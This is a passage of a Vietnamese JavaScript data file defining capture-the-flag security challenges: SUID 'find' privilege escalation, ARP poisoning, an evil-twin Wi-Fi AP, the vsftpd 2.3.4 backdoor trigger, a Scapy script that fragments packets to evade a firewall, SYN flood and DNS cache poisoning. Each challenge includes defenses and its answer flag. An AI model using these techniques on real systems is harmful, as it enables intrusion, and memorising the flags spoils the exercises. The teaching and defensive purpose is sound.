                description: "Kẻ tấn công chiếm được tài khoản thường devops (uid=1001) trên máy trạm lập trình viên. Rà quét phân quyền phát hiện một binary hệ thống được bật cờ SUID (-rwsr-xr-x) thuộc quyền root. Hãy xác định cú pháp GTFOBins chuẩn với binary /usr/bin/find để spawn một root shell và chiếm quyền quản trị cao nhất!",
                theory: "SUID (Set User ID) là một cơ chế phân quyền đặc biệt trên các hệ điều hành họ Unix/Linux. Khi một file thực thi có cờ SUID được bật (bit 4000), bất kỳ người dùng nào khởi chạy file đó đều sở hữu Effective User ID (EUID) tương đương với chủ sở hữu file (thường là root). Nếu binary hỗ trợ tính năng chạy lệnh ngoài hoặc spawn shell (như find, vim, nmap, bash), kẻ tấn công có thể lạm dụng để leo thang trực tiếp từ tài khoản thường lên root (tham khảo dự án GTFOBins).",
                sandboxType: "forensics",
                sandboxData: {
                    type: "suid-audit",
                    user: "devops (uid=1001)",
                    vulnerableBinary: "/usr/bin/find (SUID bit set)"
                },
                codeSnippet: `devops@workstation:~$ id
uid=1001(devops) gid=1001(devops) groups=1001(devops)

devops@workstation:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/find
/usr/bin/mount
/usr/bin/pkexec

devops@workstation:~$ ls -l /usr/bin/find
-rwsr-xr-x 1 root root 198944 Jan 15 2026 /usr/bin/find

---
YÊU CẦU:
Tra cứu kho lưu trữ GTFOBins cho binary có cờ SUID trên. Xác định cú pháp khai thác với binary 'find':
Thực thi lệnh shell 'sh' với tham số bảo toàn quyền root ('-p').
Cú pháp cờ: FLAG{find_exec_<tên_shell>_<cờ_bảo_toàn_quyền>}
(Ví dụ: nếu thực thi bash với cờ -p thì cú pháp là: FLAG{find_exec_bash_p})`,
                virtualFiles: {
                    "suid_list.txt": `/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/pkexec`,
                    "gtfobins_hint.txt": `Reference: gtfobins.github.io/gtfobins/find/#suid`
                },
                defense: `1. Rà soát và gỡ bỏ quyền SUID đối với các binary không thực sự cần thiết:
chmod u-s /usr/bin/find
2. Thiết lập tùy chọn 'nosuid' trong /etc/fstab đối với các phân vùng lưu trữ của người dùng (/home, /tmp, /dev/shm).
3. Sử dụng công cụ auditd giám sát sự kiện thực thi các tiến trình có thay đổi đặc quyền EUID.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Tra cứu GTFOBins tại <code>gtfobins.github.io/gtfobins/find</code>.<br>
            • LinPEAS: Linux Privilege Escalation Awesome Script.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Lệnh <code>find</code> có tùy chọn <code>-exec</code>.<br>
            - Khi gọi <code>sh</code>, cờ <code>-p</code> giúp giữ nguyên Effective User ID (root).
        </div>
    </div>
</div>`,
                flag: "FLAG{find_exec_sh_p}"
            },

            // --- DOMAIN 3: LAN DOMAIN ---
            {
                id: 5,
                domain: "lan",
                domainVi: "3. Vùng Mạng LAN (LAN Domain)",
                title: "Thử Thách 5: Bắt Gói Tin ARP Poisoning & Đánh Chặn NetNTLMv2",
                category: "Tấn Công Trung Gian (MITM / ARP Spoofing)",
                difficulty: "Trung bình",
                points: 150,
                mitre: { tactic: "Credential Access", technique: "T1557.002", name: "Adversary-in-the-Middle: ARP Poisoning" },
                description: "Kẻ tấn công cắm laptop vào ổ cắm mạng LAN phòng họp và gửi các gói tin Gratuitous ARP giả mạo để chiếm vị trí trung gian giữa máy kế toán 192.168.1.50 và Gateway 192.168.1.1. Phân tích file pcap để xác định địa chỉ MAC của kẻ tấn công và giá trị Username bị nghe lén trong phiên xác thực SMB/NTLMSSP!",
                theory: "Giao thức phân giải địa chỉ ARP (Address Resolution Protocol - RFC 826) hoạt động ở Layer 2 và không có bất kỳ cơ chế xác thực nào. Bất kỳ máy nào cũng có thể gửi gói ARP Reply (hoặc Gratuitous ARP) thông báo rằng địa chỉ IP của Default Gateway đang thuộc về địa chỉ MAC của mình. Máy nạn nhân sẽ cập nhật bảng ARP Cache và chuyển tiếp toàn bộ lưu lượng qua máy kẻ tấn công trước khi ra Internet.",
                sandboxType: "wireshark",
                sandboxData: {
                    packets: [
                        { no: 1, time: "0.000", src: "00:0c:29:ab:cd:ef", dst: "ff:ff:ff:ff:ff:ff", proto: "ARP", info: "192.168.1.1 is at 00:0c:29:ab:cd:ef (Gratuitous ARP - DUP IP)" },
                        { no: 2, time: "0.102", src: "00:0c:29:ab:cd:ef", dst: "00:1a:2b:3c:4d:5e", proto: "ARP", info: "Reply 192.168.1.1 is-at 00:0c:29:ab:cd:ef" },
                        { no: 3, time: "1.450", src: "192.168.1.50", dst: "192.168.1.200", proto: "TCP", info: "52410 -> 445 [SYN] Seq=0" },
                        { no: 4, time: "1.452", src: "192.168.1.200", dst: "192.168.1.50", proto: "TCP", info: "445 -> 52410 [SYN, ACK] Seq=0 Ack=1" },
                        { no: 5, time: "1.520", src: "192.168.1.50", dst: "192.168.1.200", proto: "SMB2", info: "Session Setup Request, NTLMSSP_AUTH, User: CORP-NET\\hr_director" }
                    ]
                },
                codeSnippet: `=== WIRESHARK PACKET SNIPPET (lan_sniff.pcap) ===

[Frame 41] 09:30:01.102 ARP Reply
    Sender MAC: 00:0c:29:ab:cd:ef
    Sender IP:  192.168.1.1 (Gateway IP)
    Target MAC: 00:1a:2b:3c:4d:5e (Victim IP: 192.168.1.50)
    [Expert Info (Warning/Sequence): Duplicate IP address detected for 192.168.1.1!
     Real Gateway MAC previously recorded: 00:50:56:c0:00:01]

[Frame 89] 09:30:05.420 SMB2 Protocol
    Source: 192.168.1.50:52410 -> Dest: 192.168.1.200:445
    Command: Session Setup Request (0x0001)
    Security Blob (NTLMSSP):
        NTLMSSP_AUTH
        Domain: CORP-NET
        User: hr_director
        Workstation: PC-HR-04
        NTLMv2 Response: 8a4b2c1d0e...

---
YÊU CẦU:
1. Xác định địa chỉ MAC của kẻ tấn công đang gửi gói ARP đầu độc mạng (Sender MAC trong Frame 41).
2. Xác định Username của nạn nhân bị đánh chặn xác thực SMB2 (User trong Frame 89).
Cú pháp cờ: FLAG{<MAC_Attacker>_<Username>}
(Ví dụ mẫu: FLAG{11:22:33:44:55:66_admin})`,
                virtualFiles: {
                    "arp_table.txt": `IP 192.168.1.1 -> MAC 00:0c:29:ab:cd:ef (POISONED)\nIP 192.168.1.50 -> MAC 00:1a:2b:3c:4d:5e`,
                    "responder.log": `[SMB2] Captured NetNTLMv2 hash from user: hr_director`
                },
                defense: `1. Kích hoạt Dynamic ARP Inspection (DAI) trên Switch Cisco:
ip arp inspection vlan 10
ip arp inspection validate src-mac dst-mac ip
2. Bật DHCP Snooping để xây dựng bảng ánh xạ tin cậy (DHCP Snooping Binding Table):
ip dhcp snooping
ip dhcp snooping vlan 10
3. Tắt xác thực NTLMv1 và ép buộc ký số SMB (SMB Signing) để chống chuyển tiếp NTLM Relay.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Wireshark filter: <code>arp.duplicate-address-detected || smb2</code>.<br>
            • Xem trực quan bảng gói tin ở Tab 2 "Môi Trường Thực Nghiệm"!
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Frame 41 chỉ ra MAC giả mạo đang tự nhận là 192.168.1.1.<br>
            - Frame 89 chứa thông tin đăng nhập NTLMSSP của tài khoản nạn nhân.
        </div>
    </div>
</div>`,
                flag: "FLAG{00:0c:29:ab:cd:ef_hr_director}"
            },
            {
                id: 6,
                domain: "lan",
                domainVi: "3. Vùng Mạng LAN (LAN Domain)",
                title: "Thử Thách 6: Vạch Trần Wi-Fi Giả Mạo Evil Twin & Rogue AP",
                category: "Tấn Công WLAN (Evil Twin / Rogue AP)",
                difficulty: "Trung bình",
                points: 150,
                mitre: { tactic: "Collection", technique: "T1465", name: "Rogue Wi-Fi Access Points" },
                description: "Kẻ tấn công dựng trạm phát sóng Wi-Fi giả mạo (Evil Twin) phát cùng SSID 'CAMPUS_STUDENT_WIFI' với công suất phát rất cao nhằm dụ các máy laptop tự động nhảy kết nối để bắt trọn lưu lượng web. Hãy phân tích bảng quét tần số từ airodump-ng để tìm ra BSSID của Rogue AP và kênh (Channel) hoạt động!",
                theory: "Các card mạng Wi-Fi trên máy tính luôn tự động kết nối (auto-roam) sang Access Point nào có cùng tên mạng (SSID) nhưng sở hữu cường độ tín hiệu (RSSI) mạnh nhất. Lợi dụng điều này, kẻ tấn công dùng Wi-Fi Pineapple hoặc card mạng công suất cao phát đè sóng AP thật, sau đó dùng Captive Portal giả mạo để dụ người dùng nhập tài khoản mật khẩu.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "airodump-table",
                    essid: "CAMPUS_STUDENT_WIFI"
                },
                codeSnippet: `$ airodump-ng wlan0mon --essid "CAMPUS_STUDENT_WIFI"

BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID
-----------------  ---  -------  -----  --  ---  ---  ------  ----  --------------------
00:14:D1:E2:40:10  -78      210    150   1  54e  WPA2 CCMP    MGT   CAMPUS_STUDENT_WIFI
00:14:D1:E2:40:20  -75      190    180   6  54e  WPA2 CCMP    MGT   CAMPUS_STUDENT_WIFI
B4:82:C5:99:11:AA  -19     1240   3820   9  54e  OPN          NONE  CAMPUS_STUDENT_WIFI
00:14:D1:E2:40:30  -80      205    120  11  54e  WPA2 CCMP    MGT   CAMPUS_STUDENT_WIFI

---
YÊU CẦU:
Phân tích bảng quét để tìm trạm phát sóng Wi-Fi giả mạo (Evil Twin / Rogue AP):
1. BSSID của Rogue AP (viết hoa các ký tự chữ)
2. Số kênh (Channel - cột CH) mà Rogue AP đang phát sóng
Cú pháp cờ: FLAG{<BSSID>_ch<Channel>}
(Ví dụ: FLAG{AA:BB:CC:DD:EE:FF_ch3})`,
                virtualFiles: {
                    "wlan_scan.log": `BSSID B4:82:C5:99:11:AA PWR -19 CH 9 ENC OPN ESSID CAMPUS_STUDENT_WIFI`,
                    "rogue_alert.txt": `[ALERT] Rogue AP detected on Channel 9 broadcasting Open network with corporate SSID`
                },
                defense: `1. Triển khai hệ thống Wireless Intrusion Prevention System (WIPS) để tự động phát hiện và gửi khung Deauthentication ngăn người dùng kết nối tới Rogue AP.
2. Nâng cấp mạng Wi-Fi doanh nghiệp lên chuẩn WPA3-Enterprise có mã hóa 192-bit và chứng chỉ số máy chủ (Server Certificate Validation).
3. Hướng dẫn người dùng không bao giờ kết nối vào mạng mở (Open Wi-Fi) không có biểu tượng ổ khóa bảo mật.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Aircrack-ng, Kismet, Wireless Network Watcher.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Xem cột PWR: Số âm càng nhỏ (gần 0) thì cường độ tín hiệu càng mạnh.<br>
            - AP giả mạo thường hạ cấp bảo mật xuống <code>OPN</code>.<br>
            - Đọc BSSID và số hiệu cột CH tương ứng.
        </div>
    </div>
</div>`,
                flag: "FLAG{B4:82:C5:99:11:AA_ch9}"
            },

            // --- DOMAIN 4: LAN-TO-WAN DOMAIN ---
            {
                id: 7,
                domain: "lan-to-wan",
                domainVi: "4. Vùng LAN-to-WAN (LAN-to-WAN Domain)",
                title: "Thử Thách 7: Rà Quét Nmap Thiết Bị Biên & Backdoor vsftpd 2.3.4",
                category: "Trinh Sát & Rà Quét (Port Scan / Vulnerability)",
                difficulty: "Trung bình",
                points: 150,
                mitre: { tactic: "Initial Access", technique: "T1190", name: "Exploit Public-Facing Application" },
                description: "Kiểm thử viên quét trinh sát thiết bị biên (Edge Firewall / DMZ Gateway) bằng Nmap. Kết quả phát hiện cổng FTP chạy phiên bản vsftpd 2.3.4 dính lỗ hổng backdoor nổi tiếng trong lịch sử an ninh mạng (CVE-2011-2523). Hãy xác định chuỗi ký tự kích hoạt backdoor và số hiệu cổng TCP root shell mở ra!",
                theory: "Vsftpd là dịch vụ FTP phổ biến trên hệ điều hành Linux. Năm 2011, một kẻ tấn công chưa rõ danh tính đã xâm nhập vào máy chủ lưu trữ mã nguồn của vsftpd và chèn một đoạn backdoor độc hại. Khi người dùng gửi tên đăng nhập (USER) có kết thúc bằng chuỗi ký tự đặc biệt, hàm vsf_sysutil_extra() sẽ lập tức tạo một socket lắng nghe trên cổng TCP 6200 và trao quyền root shell cho bất kỳ ai kết nối vào mà không cần mật khẩu.",
                sandboxType: "web",
                sandboxData: {
                    type: "port-scanner",
                    target: "203.0.113.88",
                    ports: [
                        { port: 21, service: "ftp", version: "vsftpd 2.3.4 (VULNERABLE CVE-2011-2523)" },
                        { port: 80, service: "http", version: "Apache httpd 2.4.41" },
                        { port: 443, service: "https", version: "Apache httpd 2.4.41" }
                    ]
                },
                codeSnippet: `$ nmap -sV -p 21,80,443 -Pn 203.0.113.88
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for edge-firewall.enterprise.vn (203.0.113.88)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
80/tcp  open  http    Apache httpd 2.4.41
443/tcp open  ssl/http Apache httpd 2.4.41

---
YÊU CẦU:
Dịch vụ FTP trên cổng 21 chạy phiên bản vsftpd 2.3.4 dính lỗ hổng backdoor nổi tiếng CVE-2011-2523:
1. Chuỗi ký tự mặt cười gồm 2 ký tự ASCII nào gửi ở cuối tên người dùng (USER) sẽ kích hoạt backdoor?
2. Số hiệu cổng TCP nào được dịch vụ tự động mở ra ở chế độ nền để trao root shell cho kẻ tấn công?
Cú pháp cờ: FLAG{vsftpd_<ký_tự_mặt_cười>_port_<số_cổng>}
(Ví dụ mẫu: FLAG{vsftpd_:)_port_1234})`,
                virtualFiles: {
                    "nmap_scan.xml": `<service name="ftp" product="vsftpd" version="2.3.4" extrainfo="CVE-2011-2523"/>`,
                    "cve_details.txt": `CVE-2011-2523: Backdoor in vsftpd 2.3.4 triggers on smiley face in USER command, listening on TCP 6200.`
                },
                defense: `1. Nâng cấp ngay lập tức vsftpd lên các phiên bản ổn định mới nhất (>= 3.0.x) hoặc chuyển đổi sang SFTP (SSH File Transfer Protocol).
2. Tường lửa biên chỉ cho phép mở các cổng dịch vụ thực sự cần thiết ra ngoài Internet, áp dụng quy tắc chặn toàn bộ các cổng cao (High Ports) như 6200.
3. Sử dụng hệ thống quản lý lỗ hổng (Vulnerability Scanner) tự động quét hàng tuần các thiết bị đối diện Internet.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Nmap NSE script: <code>ftp-vsftpd-backdoor</code>.<br>
            • Metasploit module: <code>exploit/unix/ftp/vsftpd_234_backdoor</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Chuỗi ký tự kích hoạt là biểu tượng mặt cười quen thuộc (dấu hai chấm và ngoặc tròn đóng).<br>
            - Cổng TCP mở ra là cổng 4 chữ số thuộc dải 62xx.
        </div>
    </div>
</div>`,
                flag: "FLAG{vsftpd_:)_port_6200}"
            },
            {
                id: 8,
                domain: "lan-to-wan",
                domainVi: "4. Vùng LAN-to-WAN (LAN-to-WAN Domain)",
                title: "Thử Thách 8: Phân Mảnh Gói Tin IP (Fragmentation) Vượt Tường Lửa",
                category: "Vượt Tường Lửa (Firewall Evasion / IP Fragmentation)",
                difficulty: "Nâng cao",
                points: 200,
                mitre: { tactic: "Defense Evasion", technique: "T1027", name: "Obfuscated Files or Information: IP Fragmentation" },
                description: "Tường lửa Stateless ACL ở biên chặn các gói tin TCP SYN đến cổng bảo mật nội bộ 31337. Pentester sử dụng Scapy để chia nhỏ gói tin thành 2 phân mảnh IP (MTU = 8 bytes), khiến trường cổng đích L4 bị đẩy sang phân mảnh thứ 2. Tường lửa stateless không thể ráp gói tin và để lọt cả 2 fragment vào máy đích. Hãy phân tích đoạn mã Scapy và xác định giá trị trường cờ MF và Fragment Offset!",
                theory: "Tường lửa Stateless lọc gói tin độc lập từng gói mà không lưu trạng thái (State Table) để lắp ráp các phân mảnh IP (reassembly). Khi một gói tin IPv4 bị phân mảnh, Header Layer 4 (TCP/UDP) chỉ nằm trọn vẹn trong Fragment đầu tiên (offset = 0). Nếu kẻ tấn công cố tình cắt nhỏ Header TCP khiến số cổng đích bị đẩy sang Fragment tiếp theo, tường lửa ở Fragment 0 không nhận diện được số cổng và cho qua, còn Fragment 1 được cho qua vì không phải gói mở đầu kết nối.",
                sandboxType: "web",
                sandboxData: {
                    type: "scapy-debugger",
                    frag0: { offset: 0, mf: 1, bytes: "IP Header (20B) + TCP Header [0..7]" },
                    frag1: { offset: 1, mf: 0, bytes: "IP Header (20B) + TCP Header [8..19] (Contains Dst Port 31337)" }
                },
                codeSnippet: `from scapy.all import *

target_ip = "198.51.100.25"
secret_port = 31337

# Pentester muốn gửi gói TCP SYN tới cổng bảo mật 31337 qua tường lửa Stateless.
# Để che giấu cổng đích ở phân mảnh đầu, pentester cắt TCP Header tại byte thứ 8:
frag0 = IP(dst=target_ip, id=4242, flags="MF", frag=0) / TCP(sport=50000, dport=secret_port, flags="S")[:8]

# Phân mảnh thứ hai chứa phần còn lại của TCP Header:
frag1 = IP(dst=target_ip, id=4242, flags=0, frag=???) / bytes(TCP(sport=50000, dport=secret_port, flags="S"))[8:]

send([frag0, frag1])

---
YÊU CẦU:
Trong tiêu chuẩn RFC 791, trường Fragment Offset (frag) trong IP Header được tính theo khối 8 byte.
Với phân mảnh thứ 2 bắt đầu từ byte thứ 8 của payload IP gốc, giá trị trường 'frag' bằng bao nhiêu?
Cú pháp cờ: FLAG{frag_offset_<giá_trị>_target_port_<cổng>}
(Ví dụ: FLAG{frag_offset_2_target_port_80})`,
                virtualFiles: {
                    "scapy_evasion.py": `frag0 = IP(flags='MF', frag=0)/TCP(...)[:8]\nfrag1 = IP(flags=0, frag=1)/TCP(...)[8:]`,
                    "rfc791_notes.txt": `Fragment Offset is measured in units of 8 octets (64 bits).`
                },
                defense: `1. Sử dụng tường lửa Stateful Firewall hoặc Next-Generation Firewall có tính năng Virtual IP Defragmentation (lắp ráp toàn bộ các phân mảnh trước khi áp quy tắc ACL).
2. Cấu hình tường lửa từ chối các gói tin phân mảnh có kích thước quá nhỏ (Tiny Fragments Attack) hoặc kích thước mảnh đầu không đủ chứa toàn bộ Layer 4 Header.
3. Kích hoạt tính năng TCP Normalization và loại bỏ các gói tin có cờ chồng lấn (Overlapping Fragments).`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Python Scapy, Fragroute, RFC 791 Specification.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Đơn vị tính của trường Fragment Offset là 8 bytes.<br>
            - Mảnh thứ 2 bắt đầu từ byte thứ 8 -> Lấy 8 chia 8 = 1.
        </div>
    </div>
</div>`,
                flag: "FLAG{frag_offset_1_target_port_31337}"
            },

            // --- DOMAIN 5: WAN DOMAIN ---
            {
                id: 9,
                domain: "wan",
                domainVi: "5. Vùng Mạng WAN (WAN Domain)",
                title: "Thử Thách 9: Điều Tra Tấn Công SYN Flood DDoS & Kích Hoạt SYN Cookies",
                category: "Từ Chối Dịch Vụ (DoS / DDoS / SYN Flood)",
                difficulty: "Trung bình",
                points: 150,
                mitre: { tactic: "Impact", technique: "T1498.001", name: "Network Denial of Service: Direct Network Flood" },
                description: "Hệ thống Cổng thông tin tài chính bị hàng vạn IP ma từ Internet liên tục gửi các gói tin TCP SYN mà không gửi phản hồi ACK cuối cùng. Hàng đợi kết nối bán mở (SYN Backlog Queue) bị đầy nghẽn khiến người dùng hợp lệ bị từ chối phục vụ (DDoS). Quản trị viên cần kích hoạt cơ chế phòng vệ nào trong nhân Linux Kernel qua sysctl để chống lại đòn tấn công này?",
                theory: "Trong quá trình bắt tay 3 bước TCP (RFC 793), khi nhận gói SYN, máy chủ phải cấp phát một cấu trúc dữ liệu Transmission Control Block (TCB) vào bộ nhớ RAM và đặt kết nối vào hàng đợi SYN Backlog chờ gói ACK từ client. Trong cuộc tấn công SYN Flood, kẻ tấn công gửi hàng chục ngàn gói tin SYN với địa chỉ IP nguồn giả mạo khiến máy chủ gửi SYN-ACK vào hư không và giữ hàng đợi cho đến khi cạn kiệt tài nguyên bộ nhớ.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "kernel-metrics",
                    syn_recv_count: 78450,
                    backlog_max: 4096,
                    status: "SYSTEM_EXHAUSTED"
                },
                codeSnippet: `$ netstat -nat | grep SYN_RECV | wc -l
78450

$ dmesg | tail -n 4
[ 4812.102] TCP: request_sock_TCP: Possible SYN flooding on port 443. Dropping request.
[ 4812.108] TCP: SYN queue backlog is full! Legitimate clients unable to connect.
[ 4812.115] TCP: Recommend enabling kernel protection mechanism in sysctl.

$ sysctl net.ipv4.tcp_syncookies
net.ipv4.tcp_syncookies = 0

---
YÊU CẦU:
Để chống cạn kiệt bộ nhớ SYN Backlog mà không cần cấp phát socket nửa mở, quản trị viên cần thiết lập giá trị bằng 1 cho tham số kernel nào?
Cú pháp cờ: FLAG{<tên_tham_số_sysctl>=1}
(Ví dụ: FLAG{net.ipv4.ip_forward=1})`,
                virtualFiles: {
                    "sysctl_status.txt": `net.ipv4.tcp_syncookies = 0\nnet.ipv4.tcp_max_syn_backlog = 4096`,
                    "dmesg.log": `[TCP Alert] Possible SYN flooding on port 443. Recommend enabling TCP SYN Cookies in sysctl.`
                },
                defense: `1. Kích hoạt vĩnh viễn tính năng TCP SYN Cookies trong file /etc/sysctl.conf:
net.ipv4.tcp_syncookies = 1
2. Tăng kích thước hàng đợi SYN Backlog và giảm thời gian chờ thử lại (SYN-ACK retries):
net.ipv4.tcp_max_syn_backlog = 65536
net.ipv4.tcp_synack_retries = 2
3. Cấu hình module SYNPROXY trên tường lửa iptables/nftables để máy chủ proxy đứng ra xác thực gói tin bắt tay 3 bước trước khi chuyển tiếp cho backend.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <code>sysctl</code>, <code>ss -tan state syn-recv</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Tên tham số xuất hiện ngay trong lệnh kiểm tra sysctl ở đoạn log: <code>net.ipv4.tcp_syncookies</code>.<br>
            - Đặt giá trị bằng 1 để bật tính năng này.
        </div>
    </div>
</div>`,
                flag: "FLAG{net.ipv4.tcp_syncookies=1}"
            },
            {
                id: 10,
                domain: "wan",
                domainVi: "5. Vùng Mạng WAN (WAN Domain)",
                title: "Thử Thách 10: Đầu Độc Bộ Nhớ Đệm DNS (Kaminsky Cache Poisoning)",
                category: "Tấn Công Hạ Tầng Internet (DNS Poisoning / Spoofing)",
                difficulty: "Nâng cao",
                points: 200,
                mitre: { tactic: "Impact", technique: "T1584.002", name: "Compromise Infrastructure: DNS Server" },
                description: "Kẻ tấn công trên mạng diện rộng WAN khai thác lỗi thiết kế DNS thời kỳ đầu (Kaminsky Bug) bằng cách bắn liên tục hàng ngàn gói tin DNS Response giả mạo với các Transaction ID (TXID) ngẫu nhiên để ghi đè bản ghi A của máy chủ ngân hàng vietbank.vn trỏ về máy chủ lừa đảo. Hãy phân tích đoạn log gói tin DNS Response trúng khớp TXID để xác định IP máy chủ lừa đảo!",
                theory: "Cuộc tấn công Dan Kaminsky (năm 2008) khai thác điểm yếu 16-bit Transaction ID của giao thức DNS chạy trên cổng UDP không có phiên kết nối. Bằng cách gửi liên tục các truy vấn tên miền con ngẫu nhiên (như abc12.vietbank.vn) để máy chủ phân giải (Resolver) phải đi hỏi máy chủ ủy quyền bên ngoài, kẻ tấn công bắn trước hàng ngàn gói tin phản hồi giả mạo đoán số TXID. Khi đoán trúng, phần Additional Records chứa thông tin giả mạo sẽ được lưu vào bộ nhớ đệm (Cache) của Resolver trong suốt thời gian TTL.",
                sandboxType: "wireshark",
                sandboxData: {
                    packets: [
                        { no: 1, time: "0.000", src: "192.168.10.1", dst: "198.41.0.4", proto: "DNS", info: "Standard query 0x9c4e A a87b12.vietbank.vn" },
                        { no: 2, time: "0.001", src: "185.220.101.55", dst: "192.168.10.1", proto: "DNS", info: "Standard query response 0x9c4e A a87b12.vietbank.vn NS ns.attacker-controlled-dns.com" }
                    ]
                },
                codeSnippet: `=== RECURSIVE DNS RESOLVER QUERY ===
Resolver: 192.168.10.1:53210 -> Root/TLD DNS
Question: a87b12.vietbank.vn (Type A, Class IN)
Generated TXID: 0x9c4e

=== INTERCEPTED SPOOFED RESPONSE INJECTED BY ATTACKER ===
Transaction ID: 0x9c4e  [MATCHED!]
Flags: 0x8180 (Standard response, No error)
Questions: a87b12.vietbank.vn: type A
Answers:
    a87b12.vietbank.vn: type A, TTL 30, addr 185.220.101.55
Authoritative nameservers:
    vietbank.vn: type NS, TTL 86400, ns.attacker-controlled-dns.com
Additional records:
    ns.attacker-controlled-dns.com: type A, TTL 86400, addr 185.220.101.55
    vietbank.vn: type A, TTL 86400, addr 194.26.29.88  <-- [POISONED ENTRY]

---
YÊU CẦU:
1. Xác định giá trị Transaction ID (TXID) dạng thập lục phân (có tiền tố 0x).
2. Xác định địa chỉ IPv4 độc hại được kẻ tấn công gán cho tên miền chính 'vietbank.vn' trong phần Additional records để đầu độc cache.
Cú pháp cờ: FLAG{txid_<giá_trị_hex>_ip_<IP_đầu_độc>}
(Ví dụ: FLAG{txid_0x12ab_ip_1.2.3.4})`,
                virtualFiles: {
                    "dns_query.log": `TXID 0x9c4e | Query: a87b12.vietbank.vn`,
                    "dns_cache.dump": `vietbank.vn -> 194.26.29.88 (TTL: 86400, Injected by ns.attacker-controlled-dns.com)`
                },
                defense: `1. Triển khai DNSSEC (DNS Security Extensions) có chữ ký số điện tử để xác thực toàn vẹn gói tin phân giải tên miền.
2. Cấu hình ngẫu nhiên hóa cổng UDP nguồn (Source Port Randomization) tăng không gian tìm kiếm từ 16-bit (TXID) lên 32-bit (TXID + Port).
3. Sử dụng các DNS Resolver hiện đại có tính năng '0x20 bit encoding' và chặn các bản ghi out-of-bailiwick records.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Wireshark DNS filter, Dig command.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Đọc giá trị Transaction ID ở dòng đầu của phản hồi (bắt đầu bằng 0x).<br>
            - Đọc địa chỉ IP ở dòng ánh xạ cho <code>vietbank.vn</code> trong phần Additional records.
        </div>
    </div>
</div>`,
